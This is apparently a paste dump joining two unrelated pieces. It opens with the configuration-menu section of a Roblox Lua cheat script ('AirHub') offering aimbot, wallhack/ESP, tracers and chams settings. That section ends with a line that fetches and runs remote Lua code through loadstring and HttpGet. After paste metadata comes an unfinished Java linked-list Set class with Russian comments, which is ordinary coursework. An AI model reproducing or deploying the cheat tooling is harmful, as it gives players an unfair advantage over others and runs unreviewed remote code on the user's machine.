Values:AddToggle({
	Name = ""Toggle"",
	Value = Aimbot.Settings.Toggle,
	Callback = function(New, Old)
		Aimbot.Settings.Toggle = New
	end
}).Default = Aimbot.Settings.Toggle

Aimbot.Settings.LockPart = Parts[1]; Values:AddDropdown({
	Name = ""Lock Part"",
	Value = Parts[1],
	Callback = function(New, Old)
		Aimbot.Settings.LockPart = New
	end,
	List = Parts,
	Nothing = ""Head""
}).Default = Parts[1]

Values:AddTextbox({ -- Using a Textbox instead of a Keybind because the UI Library doesn't support Mouse inputs like Left Click / Right Click...
	Name = ""Hotkey"",
	Value = Aimbot.Settings.TriggerKey,
	Callback = function(New, Old)
		Aimbot.Settings.TriggerKey = New
	end
}).Default = Aimbot.Settings.TriggerKey

--[[
Values:AddKeybind({
	Name = ""Hotkey"",
	Value = Aimbot.Settings.TriggerKey,
	Callback = function(New, Old)
		Aimbot.Settings.TriggerKey = stringmatch(tostring(New), ""Enum%.[UserInputType]*[KeyCode]*%.(.+)"")
	end,
}).Default = Aimbot.Settings.TriggerKey
]]

Values:AddSlider({
	Name = ""Sensitivity"",
	Value = Aimbot.Settings.Sensitivity,
	Callback = function(New, Old)
		Aimbot.Settings.Sensitivity = New
	end,
	Min = 0,
	Max = 1,
	Decimals = 2
}).Default = Aimbot.Settings.Sensitivity

--// Aimbot Checks

Checks:AddToggle({
	Name = ""Team Check"",
	Value = Aimbot.Settings.TeamCheck,
	Callback = function(New, Old)
		Aimbot.Settings.TeamCheck = New
	end
}).Default = Aimbot.Settings.TeamCheck

Checks:AddToggle({
	Name = ""Wall Check"",
	Value = Aimbot.Settings.WallCheck,
	Callback = function(New, Old)
		Aimbot.Settings.WallCheck = New
	end
}).Default = Aimbot.Settings.WallCheck

Checks:AddToggle({
	Name = ""Alive Check"",
	Value = Aimbot.Settings.AliveCheck,
	Callback = function(New, Old)
		Aimbot.Settings.AliveCheck = New
	end
}).Default = Aimbot.Settings.AliveCheck

--// Aimbot ThirdPerson

ThirdPerson:AddToggle({
	Name = ""Enable Third Person"",
	Value = Aimbot.Settings.ThirdPerson,
	Callback = function(New, Old)
		Aimbot.Settings.ThirdPerson = New
	end
}).Default = Aimbot.Settings.ThirdPerson

ThirdPerson:AddSlider({
	Name = ""Sensitivity"",
	Value = Aimbot.Settings.ThirdPersonSensitivity,
	Callback = function(New, Old)
		Aimbot.Settings.ThirdPersonSensitivity = New
	end,
	Min = 0.1,
	Max = 5,
	Decimals = 1
}).Default = Aimbot.Settings.ThirdPersonSensitivity

--// FOV Settings Values

FOV_Values:AddToggle({
	Name = ""Enabled"",
	Value = Aimbot.FOVSettings.Enabled,
	Callback = function(New, Old)
		Aimbot.FOVSettings.Enabled = New
	end
}).Default = Aimbot.FOVSettings.Enabled

FOV_Values:AddToggle({
	Name = ""Visible"",
	Value = Aimbot.FOVSettings.Visible,
	Callback = function(New, Old)
		Aimbot.FOVSettings.Visible = New
	end
}).Default = Aimbot.FOVSettings.Visible

FOV_Values:AddSlider({
	Name = ""Amount"",
	Value = Aimbot.FOVSettings.Amount,
	Callback = function(New, Old)
		Aimbot.FOVSettings.Amount = New
	end,
	Min = 10,
	Max = 300
}).Default = Aimbot.FOVSettings.Amount

--// FOV Settings Appearance

FOV_Appearance:AddToggle({
	Name = ""Filled"",
	Value = Aimbot.FOVSettings.Filled,
	Callback = function(New, Old)
		Aimbot.FOVSettings.Filled = New
	end
}).Default = Aimbot.FOVSettings.Filled

FOV_Appearance:AddSlider({
	Name = ""Transparency"",
	Value = Aimbot.FOVSettings.Transparency,
	Callback = function(New, Old)
		Aimbot.FOVSettings.Transparency = New
	end,
	Min = 0,
	Max = 1,
	Decimal = 1
}).Default = Aimbot.FOVSettings.Transparency

FOV_Appearance:AddSlider({
	Name = ""Sides"",
	Value = Aimbot.FOVSettings.Sides,
	Callback = function(New, Old)
		Aimbot.FOVSettings.Sides = New
	end,
	Min = 3,
	Max = 60
}).Default = Aimbot.FOVSettings.Sides

FOV_Appearance:AddSlider({
	Name = ""Thickness"",
	Value = Aimbot.FOVSettings.Thickness,
	Callback = function(New, Old)
		Aimbot.FOVSettings.Thickness = New
	end,
	Min = 1,
	Max = 50
}).Default = Aimbot.FOVSettings.Thickness

FOV_Appearance:AddColorpicker({
	Name = ""Color"",
	Value = Aimbot.FOVSettings.Color,
	Callback = function(New, Old)
		Aimbot.FOVSettings.Color = New
	end
}).Default = Aimbot.FOVSettings.Color

FOV_Appearance:AddColorpicker({
	Name = ""Locked Color"",
	Value = Aimbot.FOVSettings.LockedColor,
	Callback = function(New, Old)
		Aimbot.FOVSettings.LockedColor = New
	end
}).Default = Aimbot.FOVSettings.LockedColor

--// Wall Hack Settings

WallHackChecks:AddToggle({
	Name = ""Enabled"",
	Value = WallHack.Settings.Enabled,
	Callback = function(New, Old)
		WallHack.Settings.Enabled = New
	end
}).Default = WallHack.Settings.Enabled

WallHackChecks:AddToggle({
	Name = ""Team Check"",
	Value = WallHack.Settings.TeamCheck,
	Callback = function(New, Old)
		WallHack.Settings.TeamCheck = New
	end
}).Default = WallHack.Settings.TeamCheck

WallHackChecks:AddToggle({
	Name = ""Alive Check"",
	Value = WallHack.Settings.AliveCheck,
	Callback = function(New, Old)
		WallHack.Settings.AliveCheck = New
	end
}).Default = WallHack.Settings.AliveCheck

--// Visuals Settings

ESPSettings:AddToggle({
	Name = ""Enabled"",
	Value = WallHack.Visuals.ESPSettings.Enabled,
	Callback = function(New, Old)
		WallHack.Visuals.ESPSettings.Enabled = New
	end
}).Default = WallHack.Visuals.ESPSettings.Enabled

ESPSettings:AddToggle({
	Name = ""Outline"",
	Value = WallHack.Visuals.ESPSettings.Outline,
	Callback = function(New, Old)
		WallHack.Visuals.ESPSettings.Outline = New
	end
}).Default = WallHack.Visuals.ESPSettings.Outline

ESPSettings:AddToggle({
	Name = ""Display Distance"",
	Value = WallHack.Visuals.ESPSettings.DisplayDistance,
	Callback = function(New, Old)
		WallHack.Visuals.ESPSettings.DisplayDistance = New
	end
}).Default = WallHack.Visuals.ESPSettings.DisplayDistance

ESPSettings:AddToggle({
	Name = ""Display Health"",
	Value = WallHack.Visuals.ESPSettings.DisplayHealth,
	Callback = function(New, Old)
		WallHack.Visuals.ESPSettings.DisplayHealth = New
	end
}).Default = WallHack.Visuals.ESPSettings.DisplayHealth

ESPSettings:AddToggle({
	Name = ""Display Name"",
	Value = WallHack.Visuals.ESPSettings.DisplayName,
	Callback = function(New, Old)
		WallHack.Visuals.ESPSettings.DisplayName = New
	end
}).Default = WallHack.Visuals.ESPSettings.DisplayName

ESPSettings:AddSlider({
	Name = ""Offset"",
	Value = WallHack.Visuals.ESPSettings.Offset,
	Callback = function(New, Old)
		WallHack.Visuals.ESPSettings.Offset = New
	end,
	Min = -30,
	Max = 30
}).Default = WallHack.Visuals.ESPSettings.Offset

ESPSettings:AddColorpicker({
	Name = ""Text Color"",
	Value = WallHack.Visuals.ESPSettings.TextColor,
	Callback = function(New, Old)
		WallHack.Visuals.ESPSettings.TextColor = New
	end
}).Default = WallHack.Visuals.ESPSettings.TextColor

ESPSettings:AddColorpicker({
	Name = ""Outline Color"",
	Value = WallHack.Visuals.ESPSettings.OutlineColor,
	Callback = function(New, Old)
		WallHack.Visuals.ESPSettings.OutlineColor = New
	end
}).Default = WallHack.Visuals.ESPSettings.OutlineColor

ESPSettings:AddSlider({
	Name = ""Text Transparency"",
	Value = WallHack.Visuals.ESPSettings.TextTransparency,
	Callback = function(New, Old)
		WallHack.Visuals.ESPSettings.TextTransparency = New
	end,
	Min = 0,
	Max = 1,
	Decimals = 2
}).Default = WallHack.Visuals.ESPSettings.TextTransparency

ESPSettings:AddSlider({
	Name = ""Text Size"",
	Value = WallHack.Visuals.ESPSettings.TextSize,
	Callback = function(New, Old)
		WallHack.Visuals.ESPSettings.TextSize = New
	end,
	Min = 8,
	Max = 24
}).Default = WallHack.Visuals.ESPSettings.TextSize

ESPSettings:AddDropdown({
	Name = ""Text Font"",
	Value = Fonts[WallHack.Visuals.ESPSettings.TextFont + 1],
	Callback = function(New, Old)
		WallHack.Visuals.ESPSettings.TextFont = Drawing.Fonts[New]
	end,
	List = Fonts,
	Nothing = ""UI""
}).Default = Fonts[WallHack.Visuals.ESPSettings.TextFont + 1]

BoxesSettings:AddToggle({
	Name = ""Enabled"",
	Value = WallHack.Visuals.BoxSettings.Enabled,
	Callback = function(New, Old)
		WallHack.Visuals.BoxSettings.Enabled = New
	end
}).Default = WallHack.Visuals.BoxSettings.Enabled

BoxesSettings:AddSlider({
	Name = ""Transparency"",
	Value = WallHack.Visuals.BoxSettings.Transparency,
	Callback = function(New, Old)
		WallHack.Visuals.BoxSettings.Transparency = New
	end,
	Min = 0,
	Max = 1,
	Decimals = 2
}).Default = WallHack.Visuals.BoxSettings.Transparency

BoxesSettings:AddSlider({
	Name = ""Thickness"",
	Value = WallHack.Visuals.BoxSettings.Thickness,
	Callback = function(New, Old)
		WallHack.Visuals.BoxSettings.Thickness = New
	end,
	Min = 1,
	Max = 5
}).Default = WallHack.Visuals.BoxSettings.Thickness

BoxesSettings:AddSlider({
	Name = ""Scale Increase (For 3D)"",
	Value = WallHack.Visuals.BoxSettings.Increase,
	Callback = function(New, Old)
		WallHack.Visuals.BoxSettings.Increase = New
	end,
	Min = 1,
	Max = 5
}).Default = WallHack.Visuals.BoxSettings.Increase

BoxesSettings:AddColorpicker({
	Name = ""Color"",
	Value = WallHack.Visuals.BoxSettings.Color,
	Callback = function(New, Old)
		WallHack.Visuals.BoxSettings.Color = New
	end
}).Default = WallHack.Visuals.BoxSettings.Color

BoxesSettings:AddDropdown({
	Name = ""Type"",
	Value = WallHack.Visuals.BoxSettings.Type == 1 and ""3D"" or ""2D"",
	Callback = function(New, Old)
		WallHack.Visuals.BoxSettings.Type = New == ""3D"" and 1 or 2
	end,
	List = {""3D"", ""2D""},
	Nothing = ""3D""
}).Default = WallHack.Visuals.BoxSettings.Type == 1 and ""3D"" or ""2D""

BoxesSettings:AddToggle({
	Name = ""Filled (2D Square)"",
	Value = WallHack.Visuals.BoxSettings.Filled,
	Callback = function(New, Old)
		WallHack.Visuals.BoxSettings.Filled = New
	end
}).Default = WallHack.Visuals.BoxSettings.Filled

ChamsSettings:AddToggle({
	Name = ""Enabled"",
	Value = WallHack.Visuals.ChamsSettings.Enabled,
	Callback = function(New, Old)
		WallHack.Visuals.ChamsSettings.Enabled = New
	end
}).Default = WallHack.Visuals.ChamsSettings.Enabled

ChamsSettings:AddToggle({
	Name = ""Filled"",
	Value = WallHack.Visuals.ChamsSettings.Filled,
	Callback = function(New, Old)
		WallHack.Visuals.ChamsSettings.Filled = New
	end
}).Default = WallHack.Visuals.ChamsSettings.Filled

ChamsSettings:AddToggle({
	Name = ""Entire Body (For R15 Rigs)"",
	Value = WallHack.Visuals.ChamsSettings.EntireBody,
	Callback = function(New, Old)
		WallHack.Visuals.ChamsSettings.EntireBody = New
	end
}).Default = WallHack.Visuals.ChamsSettings.EntireBody

ChamsSettings:AddSlider({
	Name = ""Transparency"",
	Value = WallHack.Visuals.ChamsSettings.Transparency,
	Callback = function(New, Old)
		WallHack.Visuals.ChamsSettings.Transparency = New
	end,
	Min = 0,
	Max = 1,
	Decimals = 2
}).Default = WallHack.Visuals.ChamsSettings.Transparency

ChamsSettings:AddSlider({
	Name = ""Thickness"",
	Value = WallHack.Visuals.ChamsSettings.Thickness,
	Callback = function(New, Old)
		WallHack.Visuals.ChamsSettings.Thickness = New
	end,
	Min = 0,
	Max = 3
}).Default = WallHack.Visuals.ChamsSettings.Thickness

ChamsSettings:AddColorpicker({
	Name = ""Color"",
	Value = WallHack.Visuals.ChamsSettings.Color,
	Callback = function(New, Old)
		WallHack.Visuals.ChamsSettings.Color = New
	end
}).Default = WallHack.Visuals.ChamsSettings.Color

TracersSettings:AddToggle({
	Name = ""Enabled"",
	Value = WallHack.Visuals.TracersSettings.Enabled,
	Callback = function(New, Old)
		WallHack.Visuals.TracersSettings.Enabled = New
	end
}).Default = WallHack.Visuals.TracersSettings.Enabled

TracersSettings:AddSlider({
	Name = ""Transparency"",
	Value = WallHack.Visuals.TracersSettings.Transparency,
	Callback = function(New, Old)
		WallHack.Visuals.TracersSettings.Transparency = New
	end,
	Min = 0,
	Max = 1,
	Decimals = 2
}).Default = WallHack.Visuals.TracersSettings.Transparency

TracersSettings:AddSlider({
	Name = ""Thickness"",
	Value = WallHack.Visuals.TracersSettings.Thickness,
	Callback = function(New, Old)
		WallHack.Visuals.TracersSettings.Thickness = New
	end,
	Min = 1,
	Max = 5
}).Default = WallHack.Visuals.TracersSettings.Thickness

TracersSettings:AddColorpicker({
	Name = ""Color"",
	Value = WallHack.Visuals.TracersSettings.Color,
	Callback = function(New, Old)
		WallHack.Visuals.TracersSettings.Color = New
	end
}).Default = WallHack.Visuals.TracersSettings.Color

TracersSettings:AddDropdown({
	Name = ""Start From"",
	Value = TracersType[WallHack.Visuals.TracersSettings.Type],
	Callback = function(New, Old)
		WallHack.Visuals.TracersSettings.Type = tablefind(TracersType, New)
	end,
	List = TracersType,
	Nothing = ""Bottom""
}).Default = Fonts[WallHack.Visuals.TracersSettings.Type + 1]

HeadDotsSettings:AddToggle({
	Name = ""Enabled"",
	Value = WallHack.Visuals.HeadDotSettings.Enabled,
	Callback = function(New, Old)
		WallHack.Visuals.HeadDotSettings.Enabled = New
	end
}).Default = WallHack.Visuals.HeadDotSettings.Enabled

HeadDotsSettings:AddToggle({
	Name = ""Filled"",
	Value = WallHack.Visuals.HeadDotSettings.Filled,
	Callback = function(New, Old)
		WallHack.Visuals.HeadDotSettings.Filled = New
	end
}).Default = WallHack.Visuals.HeadDotSettings.Filled

HeadDotsSettings:AddSlider({
	Name = ""Transparency"",
	Value = WallHack.Visuals.HeadDotSettings.Transparency,
	Callback = function(New, Old)
		WallHack.Visuals.HeadDotSettings.Transparency = New
	end,
	Min = 0,
	Max = 1,
	Decimals = 2
}).Default = WallHack.Visuals.HeadDotSettings.Transparency

HeadDotsSettings:AddSlider({
	Name = ""Thickness"",
	Value = WallHack.Visuals.HeadDotSettings.Thickness,
	Callback = function(New, Old)
		WallHack.Visuals.HeadDotSettings.Thickness = New
	end,
	Min = 1,
	Max = 5
}).Default = WallHack.Visuals.HeadDotSettings.Thickness

HeadDotsSettings:AddSlider({
	Name = ""Sides"",
	Value = WallHack.Visuals.HeadDotSettings.Sides,
	Callback = function(New, Old)
		WallHack.Visuals.HeadDotSettings.Sides = New
	end,
	Min = 3,
	Max = 60
}).Default = WallHack.Visuals.HeadDotSettings.Sides

HeadDotsSettings:AddColorpicker({
	Name = ""Color"",
	Value = WallHack.Visuals.HeadDotSettings.Color,
	Callback = function(New, Old)
		WallHack.Visuals.HeadDotSettings.Color = New
	end
}).Default = WallHack.Visuals.HeadDotSettings.Color

HealthBarSettings:AddToggle({
	Name = ""Enabled"",
	Value = WallHack.Visuals.HealthBarSettings.Enabled,
	Callback = function(New, Old)
		WallHack.Visuals.HealthBarSettings.Enabled = New
	end
}).Default = WallHack.Visuals.HealthBarSettings.Enabled

HealthBarSettings:AddDropdown({
	Name = ""Position"",
	Value = WallHack.Visuals.HealthBarSettings.Type == 1 and ""Top"" or WallHack.Visuals.HealthBarSettings.Type == 2 and ""Bottom"" or WallHack.Visuals.HealthBarSettings.Type == 3 and ""Left"" or ""Right"",
	Callback = function(New, Old)
		WallHack.Visuals.HealthBarSettings.Type = New == ""Top"" and 1 or New == ""Bottom"" and 2 or New == ""Left"" and 3 or 4
	end,
	List = {""Top"", ""Bottom"", ""Left"", ""Right""},
	Nothing = ""Left""
}).Default = WallHack.Visuals.HealthBarSettings.Type == 1 and ""Top"" or WallHack.Visuals.HealthBarSettings.Type == 2 and ""Bottom"" or WallHack.Visuals.HealthBarSettings.Type == 3 and ""Left"" or ""Right""

HealthBarSettings:AddSlider({
	Name = ""Transparency"",
	Value = WallHack.Visuals.HealthBarSettings.Transparency,
	Callback = function(New, Old)
		WallHack.Visuals.HealthBarSettings.Transparency = New
	end,
	Min = 0,
	Max = 1,
	Decimals = 2
}).Default = WallHack.Visuals.HealthBarSettings.Transparency

HealthBarSettings:AddSlider({
	Name = ""Size"",
	Value = WallHack.Visuals.HealthBarSettings.Size,
	Callback = function(New, Old)
		WallHack.Visuals.HealthBarSettings.Size = New
	end,
	Min = 2,
	Max = 10
}).Default = WallHack.Visuals.HealthBarSettings.Size

HealthBarSettings:AddSlider({
	Name = ""Blue"",
	Value = WallHack.Visuals.HealthBarSettings.Blue,
	Callback = function(New, Old)
		WallHack.Visuals.HealthBarSettings.Blue = New
	end,
	Min = 0,
	Max = 255
}).Default = WallHack.Visuals.HealthBarSettings.Blue

HealthBarSettings:AddSlider({
	Name = ""Offset"",
	Value = WallHack.Visuals.HealthBarSettings.Offset,
	Callback = function(New, Old)
		WallHack.Visuals.HealthBarSettings.Offset = New
	end,
	Min = -30,
	Max = 30
}).Default = WallHack.Visuals.HealthBarSettings.Offset

HealthBarSettings:AddColorpicker({
	Name = ""Outline Color"",
	Value = WallHack.Visuals.HealthBarSettings.OutlineColor,
	Callback = function(New, Old)
		WallHack.Visuals.HealthBarSettings.OutlineColor = New
	end
}).Default = WallHack.Visuals.HealthBarSettings.OutlineColor

--// Crosshair Settings

CrosshairSettings:AddToggle({
	Name = ""Mouse Cursor"",
	Value = UserInputService.MouseIconEnabled,
	Callback = function(New, Old)
		UserInputService.MouseIconEnabled = New
	end
}).Default = UserInputService.MouseIconEnabled

CrosshairSettings:AddToggle({
	Name = ""Enabled"",
	Value = WallHack.Crosshair.Settings.Enabled,
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.Enabled = New
	end
}).Default = WallHack.Crosshair.Settings.Enabled

CrosshairSettings:AddColorpicker({
	Name = ""Color"",
	Value = WallHack.Crosshair.Settings.Color,
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.Color = New
	end
}).Default = WallHack.Crosshair.Settings.Color

CrosshairSettings:AddSlider({
	Name = ""Transparency"",
	Value = WallHack.Crosshair.Settings.Transparency,
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.Transparency = New
	end,
	Min = 0,
	Max = 1,
	Decimals = 2
}).Default = WallHack.Crosshair.Settings.Transparency

CrosshairSettings:AddSlider({
	Name = ""Size"",
	Value = WallHack.Crosshair.Settings.Size,
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.Size = New
	end,
	Min = 8,
	Max = 24
}).Default = WallHack.Crosshair.Settings.Size

CrosshairSettings:AddSlider({
	Name = ""Thickness"",
	Value = WallHack.Crosshair.Settings.Thickness,
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.Thickness = New
	end,
	Min = 1,
	Max = 5
}).Default = WallHack.Crosshair.Settings.Thickness

CrosshairSettings:AddSlider({
	Name = ""Gap Size"",
	Value = WallHack.Crosshair.Settings.GapSize,
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.GapSize = New
	end,
	Min = 0,
	Max = 20
}).Default = WallHack.Crosshair.Settings.GapSize

CrosshairSettings:AddSlider({
	Name = ""Rotation (Degrees)"",
	Value = WallHack.Crosshair.Settings.Rotation,
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.Rotation = New
	end,
	Min = -180,
	Max = 180
}).Default = WallHack.Crosshair.Settings.Rotation

CrosshairSettings:AddDropdown({
	Name = ""Position"",
	Value = WallHack.Crosshair.Settings.Type == 1 and ""Mouse"" or ""Center"",
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.Type = New == ""Mouse"" and 1 or 2
	end,
	List = {""Mouse"", ""Center""},
	Nothing = ""Mouse""
}).Default = WallHack.Crosshair.Settings.Type == 1 and ""Mouse"" or ""Center""

CrosshairSettings_CenterDot:AddToggle({
	Name = ""Center Dot"",
	Value = WallHack.Crosshair.Settings.CenterDot,
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.CenterDot = New
	end
}).Default = WallHack.Crosshair.Settings.CenterDot

CrosshairSettings_CenterDot:AddColorpicker({
	Name = ""Center Dot Color"",
	Value = WallHack.Crosshair.Settings.CenterDotColor,
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.CenterDotColor = New
	end
}).Default = WallHack.Crosshair.Settings.CenterDotColor

CrosshairSettings_CenterDot:AddSlider({
	Name = ""Center Dot Size"",
	Value = WallHack.Crosshair.Settings.CenterDotSize,
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.CenterDotSize = New
	end,
	Min = 1,
	Max = 6
}).Default = WallHack.Crosshair.Settings.CenterDotSize

CrosshairSettings_CenterDot:AddSlider({
	Name = ""Center Dot Transparency"",
	Value = WallHack.Crosshair.Settings.CenterDotTransparency,
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.CenterDotTransparency = New
	end,
	Min = 0,
	Max = 1,
	Decimals = 2
}).Default = WallHack.Crosshair.Settings.CenterDotTransparency

CrosshairSettings_CenterDot:AddToggle({
	Name = ""Center Dot Filled"",
	Value = WallHack.Crosshair.Settings.CenterDotFilled,
	Callback = function(New, Old)
		WallHack.Crosshair.Settings.CenterDotFilled = New
	end
}).Default = WallHack.Crosshair.Settings.CenterDotFilled

--// Functions / Functions

FunctionsSection:AddButton({
	Name = ""Reset Settings"",
	Callback = function()
		Aimbot.Functions:ResetSettings()
		WallHack.Functions:ResetSettings()
		Library.ResetAll()
	end
})

FunctionsSection:AddButton({
	Name = ""Restart"",
	Callback = function()
		Aimbot.Functions:Restart()
		WallHack.Functions:Restart()
	end
})

FunctionsSection:AddButton({
	Name = ""Exit"",
	Callback = Library.Unload,
})

FunctionsSection:AddButton({
	Name = ""Copy Script Page"",
	Callback = function()
		setclipboard(""https://github.com/Exunys/AirHub"")
	end
})

--// AirHub V2 Prompt

do
	local Aux = Instance.new(""BindableFunction"")
    
	Aux.OnInvoke = function(Answer)
		if Answer == ""No"" then
			return
		end

		Library.Unload()
		loadstring(game:HttpGet(""https://raw.githubusercontent.com/Exunys/AirHub-V2/main/src/Main.lua""))()
	end


end"
AkE1V6nx,linked,Tochoz,Java,Friday 10th of May 2024 07:16:39 AM CDT,"package linkedlist;

public class Set {
    private Item tail;
    private int start, end;

    private class Item{ // Элемент списка
        private int val; // Храним число множества
        private Item next; // Указатель на следующий

        private Item(int val){
            this.val = val;
        }

        private Item(int val, Item next){
            this.val = val;
            this.next = next;
        }

        private Item(Item B){
            val = B.val;
        }

        private void insertAfter(Item B){ // Метод вставляет элемент после текущего
            B.next = next;
            next = B;
        }
        private void deleteAfter(){
            next = next.next;
        }

        @Override
        public String toString() {
            return String.valueOf(val);
        }
    }

    public Set(int start, int end) {
        this.start = start;
        this.end = end;
    }

    public Set(Set A){ // Копирующий конструктор
        start = A.start;
        end = A.end;
        tail = copylist(A.tail);
    }

    private Set(int start, int end, Set B){
        this.start = start;
        this.end = end;
        this.tail = copylist(B.tail);
    }

    // TODO в ASSIGN нужен
    private Item copylist(Item reftail){ // Метод формирует копию входного кольцевого списка и возвращает хвост
        Item newtail = new Item(reftail);
        newtail.next = newtail;
        // Проходом по кольцевому списку копируем
        Item fir = newtail, sec = reftail.next; // Указатели по текущему и образцу
        while (sec != reftail){ // Проход пока не дойдём до хвоста
            fir.insertAfter(new Item(sec));
            fir = fir.next;
            sec = sec.next;
        }
        return newtail;
    }

    private boolean isInSet(int x){ // Проверка находится ли элемент в множестве если оно состоит из более чем 1го элемента
        if (tail.val == x) return true; // Если элемент в хвосте
        Item prev = findPrevItem(tail, x); // Иначе ищем предыдущий

        // Если следующий элемент и есть искомое число то оно содержится в множестве
        return prev.next.val == x;
    }

    private Item findPrevItem(Item start, int x){ // Поиск элемента перед потенциальным местом x если он точно идёт до хвоста посик начинается с заданного элемента

        Item fir = start, sec = start.next; // Указатели по текущему и образцу
        while (sec.val < x){ // Пока мы не дойдём до хвоста либо до элемента значение которого больше или равно искомому
            if (sec == tail) break;
            fir = fir.next;
            sec = sec.next;
        }

        return fir; // Если дошли до хвоста, то будет возвращён предпоследний
    }

    public boolean isCrossing(Set B) { // Доп метод проверяет пересекаются множества или нет

        if (start > B.end || B.start > end) // случай когда она не пересекаются по границам они либо пустые, тогда не пересекаются либо не пустые и тогда не пересекаются
            return false;

        if (B==this) // Если указатели совпадают то множества пересекаются
            return true;

        Item a = tail.next, b = B.tail.next;// проход с головы каждого

        //пока не дойдём до конца хоть одного из списков если нашли совпадающие return true
        while (a != tail && b != B.tail){
            if (a.val == b.val) return true;
            // Двигаем указатель с минимальным числом
            if (a.val < b.val)
                a = a.next;
            else
                b = b.next;
        }

        if (a == tail){ // Если дошли до хвоста в первом списке
            while (b != B.tail){ // Проверяем остаток второго списка на наличие в нём хвоста первого
                if (a.val == b.val) return true;
                b = b.next;
            }
            // Сравниваем хвосты
            if (a.val == b.val) return true;
        } else { // Дошли до хвоста во втором списке
            while (a != tail){ // Проверяем остаток первого списка на наличие в нём хвоста второго
                if (a.val == b.val) return true;
                a = a.next;
            }
            // Сравниваем хвосты
            if (a.val == b.val) return true;
        }

        return false;

    }

    private Set union(Set B) { // TODO либо делать на основе копии либо разруливать первые
        /*// Создать пустой список с временным хвостом
        Item restail = new Item(0);
        restail.next = restail;
        Item r = restail; // указатель r по новому списку

        // Результирующие границы итогового множества
        int resStart = (start < B.start ? start : B.start);
        int resEnd = (end>B.end ? end : B.end);

        Item a = tail.next, b = B.tail.next; // Указатели для прохода по спискам
        while (a != tail && b != B.tail) {
            if (a.val == b.val) { // если значения совпадают, добавляем в результат и идём дальше в обоих
                r.insertAfter(new Item(a));
                a = a.next;
                b = b.next;
            } else if (a.val < b.val) { // если в А число меньше, добавляем его в результат и идём дальше в первом
                r.insertAfter(new Item(a));
                a = a.next;
            } else { // иначе добавляем второе и идём дальше во втором
                r.insertAfter(new Item(b));
                b = b.next;
            }
            r = r.next;
        }


        r = unionTail(r, a, b, B.tail); // Вызвать метод который объединит хвост и последний элемент, вернёт указатель в списке резулоьтате
        r.next = restail.next; // Отвязываем временный хвост
        return new Set(resStart, resEnd, r);
        */

        // Результирующие границы итогового множества
        int resStart = (start < B.start ? start : B.start);
        int resEnd = (end>B.end ? end : B.end);

        Set RES = new Set(resStart, resEnd, this); // Копия первого множества с объединёнными границами

        Item b = B.tail.next, prev = RES.tail; // Указатели на элементы второго множества и поиска по результату
        while (b!= B.tail && b.val < RES.tail.val){ // Проход по всем элементам множества B которые меньше хвоста A
            prev = findPrevItem(prev, b.val); // Ищем элемент в результирующем множестве перед потенциальным местом вставки

            if (prev.next.val != b.val) // Если такого элемента нет, вставляем
                prev.insertAfter(new Item(b));

            b = b.next; // Идём дальше во втором

            prev = prev.next; // Следующий поиск начнём с вставленного или существующего элемента
        }
        unionTail(RES, prev, b, B.tail);// Вызываем метод объединения хвостов множеств
        return RES;
    }

    // Метод завершает объединение множеств, вызывается в случае когда в одном из множеств дошли до хвоста
    // Модифицирует результирующее множество
    private void  unionTail(Set RES, Item prev, Item b, Item tailB){
        /*if (a == tail && b == tailB) { // Если дошли до хвостов в обоих множествах, вставляем в порядке возрастания
            if (a.val < b.val) {
                r.insertAfter(new Item(a));
                r = r.next;
                r.insertAfter(new Item(b));
            } else if (a.val > b.val) {
                r.insertAfter(new Item(b));
                r = r.next;
                r.insertAfter(new Item(a));
            } else { // Если равны
                r.insertAfter(new Item(a));
            }
            r = r.next;
            return r;
        }

        // Переставляем указатели так чтобы дошли до конца в первом
        Item secTail = tailB, temp;
        if (b == tailB) {
            temp = a;
            a = b;
            b = temp;
            secTail = tail;
        }

        while (b != secTail && b.val < a.val){ // доходим до неменьшего элемента второго списка (или конца)
            r.insertAfter(new Item(b));
            r = r.next;
            b = b.next;
        }
        r.insertAfter(new Item(a)); // Вставляем хвост первого списка
        r = r.next;
        if (a.val == b.val)  // если во втором списке элемент равен хвосту первого, пропускаем его
            b = b.next;

        while (b != secTail){ // проходим до конца второго списка и вставляем
            r.insertAfter(new Item(b));
            r = r.next;
            b = b.next;
        }

        r.insertAfter(new Item(b)); // Вставляем хвост второго списка
        r = r.next;
        return r;
         */

        // Если дошли до обоих хвостов
        if (b == tailB && prev.next == RES.tail){
            if (b.val < RES.tail.val){
                prev.insertAfter(new Item(b));
            } else if (b.val > RES.tail.val) {
                RES.tail.insertAfter(new Item(b));
                RES.tail = RES.tail.next;
            }
            return;
        }

        // Если дошли до конца второго, но не до хвоста первого
        if (b == tailB){
            if (prev.next.val != b.val) // Если хвоста второго нет в первом, добавляем
                prev.insertAfter(new Item(b));
            return;
        }


        // Если не дошли до хвоста второго но прошли хвост первого

        if (b.val == RES.tail.val) //Если элемент второго равен хвосту первого, пропускаем его
            b = b.next;

        while (b != tailB) { // Добавляем после хвоста
            RES.tail.insertAfter(new Item(b));
            RES.tail = RES.tail.next; // Двигаем хвост
            b = b.next;
        }

        RES.tail.insertAfter(new Item(b)); // Вставляем хвост второго множества в конец
        RES.tail = RES.tail.next; // Двигаем хвост
    }

    public Set UNION(Set B) {
        // если один из них пустой или указатели совпадают то вернуть копию текущего или другого
        if (B == null || B.tail == null || B == this) return new Set(this);
        if (tail == null) return new Set(B);
        // вызываем union
        return union(B);
    }

    public Set INTERSECTION(Set B) { // при удалении проверять хвост ли это
        if (B == this) return new Set(this); // если указатели совпадают то вернуть копию текущего
        if (B == null || B.tail == null || tail == null) return new Set(start, end); // если хоть один пустой вернуть пустую копию текущего

        // Результирующие границы итогового множества
        int resStart = (start < B.start ? start : B.start);
        int resEnd = (end>B.end ? end : B.end);

        // Создать пустое множество
        Set RES = new Set(resStart, resEnd);


        Item a = tail.next, b = B.tail.next; // Указатели для прохода по спискам
        while (a != tail && b != B.tail && a.val != b.val){ // Ищем первое пересечение
            if (a.val < b.val){ // если в А число меньше идём дальше в первом
                a = a.next;
            } else
